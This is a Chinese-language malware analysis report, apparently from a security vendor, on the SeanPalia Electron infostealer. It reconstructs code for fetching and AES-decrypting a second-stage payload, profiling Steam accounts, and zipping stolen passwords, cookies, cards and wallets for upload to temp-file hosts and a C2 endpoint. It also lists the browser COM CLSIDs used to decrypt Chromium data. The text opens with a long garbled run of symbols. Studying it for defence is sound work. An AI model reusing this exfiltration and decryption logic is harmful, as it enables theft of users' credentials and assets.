$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${row.target_path ?? ""}`)   
            .join("\n\n");   
          await deps.appendArtifact(`Downloads/$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${target.browserName}.txt`, downloadText);   
        } catch {}   
      }   
    }
```

**6. payload2 第二阶段执行链**

这一部分在代码内部对应一条标准的“第二阶段载荷处理链”：先用一组内置参数通过 AES-256-GCM 解出真实下载 URL，再对远程返回的 Base64 文本做解码，并继续走 AES-256-CBC 解出最终的 PE。主程序本身负责完成这条下载、解密、装载链， payload2 被解出来之后，会继续承担 Chromium 受保护数据的本地处理任务，例如处理带 APPB 头的数据、调用浏览器自己的解密能力，以及把这些高价值结果回交主流程。

**6.1 第二阶段载荷下载**

**功能解析：**

1. payload 里先有一 AES-256-GCM 密文

2. 该密文解出后的明文不 PE，而是第二阶段下载 URL

3. 主代码再对这 URL XHR/HTTP 请求，拉取远程第二阶段载荷

**运行结果：**

● 先得 payload2 下载 URL

● 再取 Base64 形式的第二阶段远程载

**读取目标 / 请求目标：**

```
AES-256-GCM 解出 URL:   
    GET https://raw.githubusercontent.com/RobertJunas2145/x0x/refs/heads/main/mm
```

**动态参数：**

● 阶段 A：GCM 解出的明 URL 证据

○ payload2\_deep\_dumps/0405\_decipher\_output\_update\_aes-256-gcm.bin

○ 内容：<https://raw.githubusercontent.com/RobertJunas2145/x0x/refs/heads/main/mm>

● 原始响应文件：

○ payload2\_deep\_dumps/0407\_served\_payload2\_raw\_base64.bin

● 原始响应大小

○ 770,777 字节

● 关键 XHR 事件

○ XHR\_OPEN

○ XHR\_SEND

○ PAYLOAD2\_XHR\_SERVED\_LOCAL

**参数：**

● gcmEncryptedUrl

○ payload 内置 GCM 密文 URL

● gcmKey

○ 用于解出下载 URL 的第一阶段 key

● gcmIv

○ 用于解出下载 URL 的第一阶段 iv

● httpGet

○ 发起第二阶段远程下载

● payload2Url

○ 第二阶段载荷 URL

**代码：**

```
<pre language="javascript" code_block="true"><code><font size="3" face="微软雅黑">/**   
     * 先用 AES-256-GCM 解出下载 URL，再通过 XHR/HTTP 拉取第二阶段 payload     
     */   
    async function downloadPayload2(deps) {   
      // 第一阶段：GCM 解密得到真正 payload2 下载地址   
      const url = await deps.decryptUrlWithGcm();   
         
      // 第二阶段：对 URL 发请求；分析环境里可以被 hook 成返回本 c2_mm_payload.bin   
      const payload = deps.serveLocalPayloadIfHooked   
        ? await deps.serveLocalPayloadIfHooked(url)   
        : await deps.httpGet(url);   
         
      return { url, payload };   
    }    </font></code></pre><p data-track="688"></p>
```

**6.2 Base64 解码与 AES 解密**

**功能解析：**

1. 先把远程响应当作 Base64 文本解码成二进制密文

2. 再使 AES-256-CBC 对该二进制密文做解密

3. 从动态数据看，主代码：payload2 至少存在一层明确的对称解密

**运行结果：**

● 解密后的本地辅助 PE 模块

**读取目标 / 请求目标：**

```
    payload2_deep_dumps/0407_served_payload2_raw_base64.bin   
    payload2_deep_dumps/0410_decipher_input_aes-256-cbc.bin   
    payload2_deep_dumps/0411_decipher_output_update_aes-256-cbc.bin
```

**动态参数：**

● CBC 解密输入

○ 578,064 字节

● CBC 解密输出

○ 578,048 字节

● CBC key

○ payload2\_deep\_dumps/0408\_decipher\_key\_aes-256-cbc.bin

○ 长度 32 字节

○ hex: 8888e9f69db0abf36046076df1b00bf0fe7e9a9e2583b8791bb172100a4cac58

● CBC iv

○ payload2\_deep\_dumps/0409\_decipher\_iv\_aes-256-cbc.bin

○ 长度 16 字节

○ hex: bbf65d08c9830be0ed3ad56a9e7f48a5

● 解密产物

○ payload2\_deep\_dumps/0411\_decipher\_output\_update\_aes-256-cbc.bin

○ MZ 开头

○ SHA256: 55e80a984d85bc95cd3b5ac2678e478b966001b270398b0147e7314e9a2126ad

**代码：**

```
/**   
     * 对第二阶 payload 执行 Base64 解码，再 AES-256-CBC 解密，得 Windows PE     
     */   
    async function decodeAndDecryptPayload2(base64Payload: string, deps) {   
      // 第一层：Base64 文本转二进制输入   
      const encryptedBuffer = deps.base64ToBuffer(base64Payload);   
         
      // 第二层：AES-256-CBC 解密；现有证据显示输出以 MZ 开头， PE   
      const key = await deps.getPayload2Key();   
      const iv = await deps.getPayload2Iv();   
         
      return deps.aes256CbcDecrypt(encryptedBuffer, key, iv);   
    }
```

**7. 环境画像与附加情报**

这一部分在代码内部会主动发起外部查询并做本地存在性探测。它先通过 ipify / ipapi 获取公网 IP、城市、国家、ASN、运营商等信息，再检 Riot、Minecraft、Epic、Steam、Telegram、FileZilla、AnyDesk、RustDesk 等路径是否存在；如果命中 Steam，还会继续读 loginusers.vdf，提 SteamID 并调 Steam Web API 拉玩家资料、已拥有游戏和等级。此部分并非直接实施账号窃取行为，而是通过对目标主机进行标记，向攻击者提示该主机的价值及需重点关注的方向。

**7.1 公网 IP / 地理画像**

**功能解析：**

1. 请求 ipify 取公 IP

2. 再请 ipapi 取地理位置、ASN、运营商等画像

3. 失败时回退到全字段 N/A

**运行结果：**

● 形成受害者公 IP 和地理画像摘要

**读取目标 / 请求目标：**

```
GET https://api.ipify.org?format=json   
GET https://ipapi.co/<ip>/json/
```

**动态参数：**

● 关键动态字段：

○ ip

○ city

○ region

○ country\_name

○ asn

○ org

**参数：**

● http

○ 发起外部 HTTP 请求的客户端

● timeoutMs

○ 请求超时时间

**代码：**

```
/**   
     * 先调 ipify 获取公网 IP，再 ipapi 获取地域/ASN/运营商画像     
     */   
    async function fetchPublicIpProfile(deps) {   
      try {   
        // 没有 Steam  loginusers.vdf 就直接结     
        if (   
          !deps.fs.existsSync("C:\\Program Files (x86)\\Steam") ||   
          !deps.fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")   
        ) {   
          return;   
        }   
         
        //  loginusers.vdf 中提取所有匹配的 SteamID64   
        const loginUsers = deps.fs.readFileSync(   
          "C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf",   
          "utf-8"   
        );   
        const steamIds = loginUsers.match(/7656[0-9]{13}/g) || [];   
         
        // 对每 SteamID 并发拉玩家资料、拥有游戏和 Steam 等级   
        const results = await Promise.allSettled(   
          steamIds.map(async (steamId) => {   
            const [playerSummary, ownedGames, steamLevel] = await Promise.all([   
              deps.http.get(   
                "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" +   
                  steamId   
              ),   
              deps.http.get(   
                "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" +   
                  steamId   
              ),   
              deps.http.get(   
                "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" +   
                  steamId   
              ),   
            ]);   
         
            return deps.formatSteamSummary(   
              playerSummary?.data?.response,   
              ownedGames?.data?.response,   
              steamLevel?.data?.response   
            );   
          })   
        );   
         
        const fulfilled = results   
          .filter((item) => item.status === "fulfilled" && item.value)   
          .map((item: any) => item.value);   
         
        if (fulfilled.length > 0) {   
          const summaryText =   
            "xilon Steam Session (" + deps.hostLabel + ")</b>\n" + fulfilled.join("\n");   
          await deps.sendSteamSummary(summaryText);   
        }   
      } catch {}   
    }
```

**7.2 游戏 / 工具存在性探测**
**功能解析：**

1. 判断 Riot、Minecraft、Epic、Steam、Telegram、FileZilla、AnyDesk、RustDesk 是否存在。

2. 若有 Steam，会进一步读 loginusers.vdf 并补玩家资料、已拥有游戏、等级等信息。

**运行结果：**
形成“这台主机装了哪些游戏/工具”的存在性画像，若命中 Steam，则补充 Steam 账号摘要并进入最终上报链。

**读取目标 / 请求目标：**

```
C:\ProgramData\Riot Games
%APPDATA%\.minecraft
%APPDATA%\EpicGamesLauncher
C:\Program Files (x86)\Steam
C:\Program Files (x86)\Steam\config\loginusers.vdf
%APPDATA%\Telegram Desktop\tdata
%APPDATA%\FileZilla
%APPDATA%\AnyDesk
%APPDATA%\RustDesk
GET https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=
<apiKey>&steamids=<steamId>
GET https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=
<apiKey>&steamid=<steamId>
GET https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=
<apiKey>&steamid=<steamId>
```

**动态参数：**

本地存在性检查结果：

Steam 富化前提：

C:\Program Files (x86)\Steam 存在

C:\Program Files (x86)\Steam\config\loginusers.vdf 存在

**参数：**

pathExists

检查目标目录或文件是否存在fs.existsSync

检查 Steam 根目录和fs.readFileSync

读取 loginusers.vdf

http调 Steam Web API

formatSteamSummary

把玩家资料、游戏数量、等级等结果拼成可上报文本

**代码:**

```
/**
* 检查本机是否存在高价值游戏、通信工具和远控工具。
*/
async function collectGameAndToolPresence(
deps: {
pathExists: (path: string) => Promise<boolean>;
joinPath: (...parts: string[]) => string;
roamingAppData: string;
}
): Promise<{
riotGames: boolean;
minecraft: boolean;
epicGames: boolean;
steam: boolean;
filezilla: boolean;
Telegram: boolean;
Anydesk: boolean;
Rudesk: boolean;
}> {
const summary = {
riotGames: false,
minecraft: false,
epicGames: false,
steam: false,
filezilla: false,
Telegram: false,
Anydesk: false,
Rudesk: false,
};
try {
// 并发检查样本硬编码关注的路径，结果会被用于主机价值画像
const results = await Promise.all([
deps.pathExists("C:\\ProgramData\\Riot Games"),
deps.pathExists(deps.joinPath(deps.roamingAppData, ".minecraft")),
deps.pathExists(deps.joinPath(deps.roamingAppData, "EpicGamesLauncher")),
Promise.all([
deps.pathExists("C:\\Program Files (x86)\\Steam"),
deps.pathExists("C:\\Program Files
(x86)\\Steam\\config\\loginusers.vdf"),
]),
deps.pathExists(deps.joinPath(deps.roamingAppData, "Telegram Desktop",
"tdata")),
deps.pathExists(deps.joinPath(deps.roamingAppData, "FileZilla")),
deps.pathExists(deps.joinPath(deps.roamingAppData, "AnyDesk")),
deps.pathExists(deps.joinPath(deps.roamingAppData, "RustDesk")),
]);
summary.riotGames = results[0];
summary.minecraft = results[1];
summary.epicGames = results[2];
summary.steam = results[3][0] && results[3][1];
    summary.Telegram = results[4];
    summary.filezilla = results[5];
    summary.Anydesk = results[6];
    summary.Rudesk = results[7];
  } catch {}
  return summary;
}
```

如果本机存在 Steam 和 loginusers.vdf，则进一步补充 Steam 账号资料:

**代码:**

```
async function collectSteamProfileSummary(
  deps: {
    fs: {
      existsSync: (path: string) => boolean;
      readFileSync: (path: string, encoding: string) => string;
    };
    http: {
      get: (url: string) => Promise<any>;
    };
    formatSteamSummary: (playerSummary: any, ownedGames: any, steamLevel: any) =>
string;
    sendSteamSummary: (text: string) => Promise<void>;
    hostLabel: string;
  }
): Promise<void> {
  try {
    // 没有 Steam 或 loginusers.vdf 就直接结束
    if (
      !deps.fs.existsSync("C:\\Program Files (x86)\\Steam") ||
      !deps.fs.existsSync("C:\\Program Files
(x86)\\Steam\\config\\loginusers.vdf")
    ) {
      return;
    }
    // 从 loginusers.vdf 中提取所有匹配的 SteamID64
    const loginUsers = deps.fs.readFileSync(
      "C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf",
      "utf-8"
    );
    const steamIds = loginUsers.match(/7656[0-9]{13}/g) || [];
    // 对每个 SteamID 并发拉玩家资料、拥有游戏和 Steam 等级
    const results = await Promise.allSettled(
      steamIds.map(async (steamId) => {
        const [playerSummary, ownedGames, steamLevel] = await Promise.all([
          deps.http.get(
            "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?
key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" +
              steamId
          ),
          deps.http.get( "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?
key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" +
              steamId
          ),
          deps.http.get(
            "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?
key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" +
              steamId
          ),
        ]);
        return deps.formatSteamSummary(
          playerSummary?.data?.response,
          ownedGames?.data?.response,
          steamLevel?.data?.response
        );
      })
    );
    const fulfilled = results
      .filter((item) => item.status === "fulfilled" && item.value)
      .map((item: any) => item.value);
    if (fulfilled.length > 0) {
      const summaryText =
        "xilon Steam Session (" + deps.hostLabel + ")</b>\n" +
fulfilled.join("\n");
      await deps.sendSteamSummary(summaryText);
    }
  } catch {}
  }
```

**8. 归档、统计与上传**

这一部分在代码内部会先读取前面各目录里已经落好的 Passwords、Cookies、Autofills、Cards、Bookmarks、Downloads、Wallets、Extension、Private Files 等结果，统计数量并取关键字段；再把公 IP、机器信息、工具存在性、Steam 摘要 Discord token 数量拼进最终对象。随后它会生 ZIP、调用多个临时文件平台上传归档，并把下载链接、ZIP 密码和整份受害者摘要再发给 sender-moss 这类控制端接口，完成真正的“收集结果出网” 。

**8.1 ZIP 上传 tmpfile.link**

**功能解析：**

1. 构 multipart/form-data

2. ZIP 作为 file 字段上传 tmpfile.link

3. 返回 downloadLink

4. 若失败则返回 null

**运行结果：**

● 得到一个可转交 C2 或摘要消息的下载链接

**读取目标 / 请求目标：**

```
POST https://tmpfile.link/api/upload   
POST https://temp.sh/upload   
POST https://tempfile.org/api/upload/local   
POST https://upload.gofile.io/uploadfile
```

**动态参数：**

● 关键动态参数：

○ filename

○ contentType: application/zip

○ 返回 downloadLink

**参数：**

● [fileName, fileContent]

○ 上传文件名和 ZIP 内容

● FormDataCtor

○ multipart 表单构造器

● http

○ HTTP/Axios 客户

**代码：**

```
    /**   
     * 上传 ZIP 文件：tmpfile.link 并返回下载链接     
     */   
    async function uploadTmpfileLink([fileName, fileContent]: [string, string | Blob], deps) {   
      try {   
        // 组装 multipart/form-data，请求体里只有一 file 字段   
        const formData = new deps.FormDataCtor();   
        formData.append("file", fileContent, {   
          filename: fileName,   
          contentType: "application/zip",   
        });   
         
        // 把最 ZIP 上传 tmpfile.link   
        const response = await deps.http.post(   
          "https://tmpfile.link/api/upload",   
          formData,   
          {   
            headers: { ...formData.getHeaders() },   
            maxBodyLength: Infinity,   
            maxContentLength: Infinity,   
          }   
        );   
         
        return response.data?.downloadLink ?? null;   
      } catch {   
        return null;   
      }   
    }
```

**8.2 最终汇总与上报**

**功能解析：**

1. 汇总前面所有采集结果的数量和摘要

2. 拼上机器画像、公 IP、ASN、城市、国家、工具存在性等环境信息

3. 拼上钱包、扩展、私有文件、token 数量

4. 再把 ZIP 下载地址和密码并进最终结果

5. 把摘要交给后续上报链

**运行结果：**

● 形成最终受害者画像

● 为外部上 / C2 回传提供结构化摘要

**读取目标 / 请求目标：**

```
本地统计目录:   
    Passwords   
    Cookies   
    Autofills   
    Cards   
    Bookmarks   
    Downloads   
    Wallets   
    Extension   
    Private Files   
         
    下载第二阶段 payload:   
    GET https://raw.githubusercontent.com/RobertJunas2145/x0x/refs/heads/main/mm   
         
    临时文件上传:   
    POST https://temp.sh/upload   
    POST https://tmpfile.link/api/upload   
    POST https://tempfile.org/api/upload/local   
    POST https://upload.gofile.io/uploadfile   
         
    C2 / 上报:   
    POST https://api.hypercoreengine.com/sender-moss
```

**动态参数：**

● 环境画像输入

○ host

○ os

○ cpu

○ gpu

○ ramGb

○ hwid

○ publicIp

○ country

○ city

○ asn

○ org

● 本地统计输入

○ Passwords

○ Cookies

○ Autofills

○ Cards

○ Bookmarks

○ Downloads

○ Wallets

○ Extension

○ Private Files

● 关键外传参数

○ zipDownloadLink

○ zipPassword

**参数：**

● 各类统计函数

○ 密码、Cookie、Autofill、Cards、Bookmarks、Downloads

● 环境画像函数

○ 公网 IP、机器信息、工具存在性、Steam 摘要

● 资产计数函数

○ 钱包、扩展、私有文件、Discord token

● getZipUploadResult

○ 读取 ZIP 上传返回

● sendSummary

○ 发送最终摘要

**代码：**

```
/**   
     * 从各个归档目录和环境探针结果里汇总出一份结构化受害者摘要，并交给上报链     
     */   
    type FinalBundleSummary = {   
      host: string;   
      os: string;   
      cpu: string;   
      gpu?: string;   
      ramGb: number;   
      hwid: string;   
      publicIp: string;   
      country: string;   
      city: string;   
      asn: string;   
      org: string;   
      passwordCount: number;   
      cookieCount: number;   
      autofillCount: number;   
      cardCount: number;   
      bookmarkCount: number;   
      downloadCount: number;   
      walletCount: number;   
      extensionCount: number;   
      privateFileCount: number;   
      discordTokenCount: number;   
      steamSummary?: string;   
      toolPresence: Record<string, boolean>;   
      zipDownloadLink?: string;   
      zipPassword?: string;   
    };   
         
    async function collectAndUploadEncryptedArchiveBundle(deps) {   
      // 并发拉取所有已经收集好的计数、环境画像和上传结果   
      const [   
        machine,   
        publicIp,   
        toolPresence,   
        steamSummary,   
        passwordCount,   
        cookieCount,   
        autofillCount,   
        cardCount,   
        bookmarkCount,   
        downloadCount,   
        walletCount,   
        extensionCount,   
        privateFileCount,   
        discordTokenCount,   
        zipResult,   
      ] = await Promise.all([   
        deps.getMachineProfile(),   
        deps.fetchPublicIpProfile(),   
        deps.collectGameAndToolPresence(),   
        deps.collectSteamProfileSummary(),   
        deps.countArtifactEntries("Passwords"),   
        deps.countCollectedCookieLines(),   
        deps.countArtifactEntries("Autofills"),   
        deps.countArtifactEntries("Cards"),   
        deps.countArtifactEntries("Bookmarks"),   
        deps.countArtifactEntries("Downloads"),   
        deps.getWalletArtifactCount(),   
        deps.getExtensionArtifactCount(),   
        deps.getPrivateFileCount(),   
        deps.getDiscoveredDiscordTokenCount(),   
        deps.getZipUploadResult(),   
      ]);   
         
      // 组装最终上报对     
      const summary: FinalBundleSummary = {   
        host: machine.host,   
        os: machine.os,   
        cpu: machine.cpu,   
        gpu: machine.gpu,   
        ramGb: machine.ramGb,   
        hwid: machine.hwid,   
        publicIp: publicIp?.ip ?? "N/A",   
        country: publicIp?.country ?? "N/A",   
        city: publicIp?.city ?? "N/A",   
        asn: publicIp?.asn ?? "N/A",   
        org: publicIp?.org ?? "N/A",   
        passwordCount,   
        cookieCount,   
        autofillCount,   
        cardCount,   
        bookmarkCount,   
        downloadCount,   
        walletCount,   
        extensionCount,   
        privateFileCount,   
        discordTokenCount,   
        steamSummary,   
        toolPresence,   
        zipDownloadLink: zipResult.downloadLink,   
        zipPassword: zipResult.password,   
      };   
         
      // 把最终摘要送入后续上报     
      await deps.sendSummary(summary);   
      return summary;   
    }
```

**五、负责解密 Chromium 系浏览器受保护数据的本地辅助模块**

这一部分对应的是第二阶段本地辅助模块。它本身不是 SeanPalia 主程序里那条 Node.js 采集链，而是专门负责处理 Chromium 系浏览器受保护数据的原生解密组件。当前已经完成的 IDA 分析表明，这个模块的核心职责包括：

● 识别目标浏览器类

○ Google Chrome

○ Google Chrome Beta

○ Brave Browser

○ Microsoft Edge

○ Avast Secure Browser

● 构造浏览器本地数据路径

○ User Data 根目录

○ Default / Profile 1-5 配置子目录

○ Local State

○ Login Data

○ Web Data

○ History

○ Bookmarks

○ Cookies

○ Local Storage/leveldb

● 读取 APPB 头的加密数据

● 调用浏览 Elevation Service COM 组件执行解密

● 将解密结果交回上层恶意逻辑继续使用

**1.核心函数定位**

**1.1 decrypt\_collected\_appb\_blobs\_via\_com**

这是当前原生模块的主控函数，负责初始 Native API，执行反调试与自保护检查，初始 COM，枚举受支持浏览器目标，读取 APPB blob，并调用浏览 Elevation Service COM 接口完成解密，最后汇总结果交给后续流程

1. 扫描并识别目标浏览器（Chrome/Chrome Beta/Brave/Edge/Avast）

2. 构造目标数据路径（User Data、Profiles、Local State、Cookies、History 等）

3. 读取 APPB 加密数据块（浏览器保护数据）

4. 调用浏览器本 Elevation Service COM 组件执行解密

5. 将解密后的结果返回给上层 JS/Electron 主控进行后续处理

6. 不同的浏览器对应 COM他自己的对象

**参数说明：**

● 无显式参数

● 该函数主要依赖内部构造的浏览器目标描述、APPB 输入缓冲区、COM 组件 CLSID / IID 以及结果树容器完成整条解密链

返回值不是最终明文结果本身，而是内部处理结束后的状态值；实际解密结果通过结果树和后续处理流程继续传

对应代码图：

![](https://attach.52pojie.cn/forum/202605/08/111150s69zaa9akr9h95hm.png)

**1.2 resolve\_browser\_target\_descriptor**

该函数根据输入浏览器名称构造目标描述对象，填充对应 CLSID / IID / User Data / Profile / 目标文件片段，是后续路径构造与 COM 解密调用的适配层。

**参数说明：**

● out\_descriptor

○ 类型：BROWSER\_TARGET\_DESCRIPTOR \*

○ 作用：输出浏览器目标描述对象，函数会在这里写入浏览器对应 COM 标识和路径字

● browser\_name

○ 类型：浏览器名称对象指针

○ 作用：作为输入浏览器标识，用于匹配并决定当前构造哪一类浏览器分支

**当前已识别的 `CLSID / IID`：**

● Google Chrome

○ CLSID：{708860E0-F641-4611-8895-7D867DD3675B}

○ IID(primary)：{1BF5208B-295F-4992-B5F4-3A9BB6494838}

○ IID(fallback)：{463ABECF-410D-407F-8AF5-0DF35A005CC8}

● Google Chrome Beta

○ CLSID：{DD2646BA-3707-4BF8-B9A7-038691A68FC2}

○ IID(primary)：{B96A14B8-D0B0-44D8-BA68-2385B2A03254}

○ IID(fallback)：样本中同样存在备用 IID 字段，但当前主链主要使用 Chrome Beta 专属 IID

● Brave Browser

○ CLSID：{576B31AF-6369-4B6B-8560-E4B203A97A8B}

○ IID(primary)：{1BF5208B-295F-4992-B5F4-3A9BB6494838}

○ IID(fallback)：{F396861E-0C8E-4C71-8256-2FAE6D759CE9}

● Microsoft Edge

○ CLSID：{1FCBE96C-1697-43AF-9140-2897C7C69767}

○ IID(primary)：{8F7B6792-4D78-4040-BD24-AE5E140FE15D}

○ IID(fallback)：{C9C2B807-7731-4F34-81B7-44FF7779522B}

● Avast Secure Browse

○ CLSID：{EAD34EE8-8D08-4CA1-ADA3-64754374D811}

○ IID(fallback)：{7737BB9F-BAC1-4C71-8296-7C82D7994B6F}

○ IID(primary)：当前样本中该分支未像前几类那样拆出第二组独立主 IID，主要可稳定确认的是 CLSID 与一组解密接口标

○ 该截图展示的 Google Chrome 分支对应的浏览器目标描述构造结果

**1.3 wipe\_image\_headers\_and\_sections**

该函数负责清除自 PE 头和节表，属于明显的反分 / 自抹痕逻辑

**作用说明**

● 修改当前模块内存中的 PE 头和节表内容

● 降低后续静态/动态分析时可以直接恢复的模块结构信息

对应代码图:

![](https://attach.52pojie.cn/forum/202605/08/111246y647n7a0z99ga5qn.png)

**2.当前模块在整条攻击链中的作用**

从攻击链分工上看，可以把它和外层 Electron / JS 主控区分为两层：

● 外层 Electron / JS 主控

负责环境探测、关闭浏览器、扫描数据、调用辅助模块、整理数据并上传

● 当前 IDA 中的原生模块

负责 Chromium 系浏览器中原本受保护、不能直接明文读取的数据解出来

因此，这个模块在整条链里的最准确定位是：

SeanPalia 主窃密链中的“浏览器本地解密 / 受保护数据辅助采集模块”

**火绒安全在此提醒广大用户**，Electron 应用已成为窃密木马的高频伪装载体，SeanPalia 这类样本可窃取浏览器账号密码、Cookie、信用卡信息、加密货币钱包数据及 Discord、Steam 等高价值账号资产，危害极大。广大用户需谨慎下载来历不明的桌面软件，避免运行非官方渠道的绿色版、[破解](https://www.52pojie.cn)版工具；及时更新安全软件并开启实时防护，不要轻易关闭安全提示。一旦发现设备出现浏览器异常退出、进程无故被结束等情况，应立即进行全盘查杀，防止敏感信息与数字资产被盗。

**C&C：**

![](https://attach.52pojie.cn/forum/202605/08/111308eo6d6fz6dmfsokyo.png)

**SHA256：**

![](https://attach.52pojie.cn/forum/202605/08/111319zxwlvhkhwz4sx3xs.png)

文中参考链接：

https://bbs.kanxue.com/thread-288619.htm
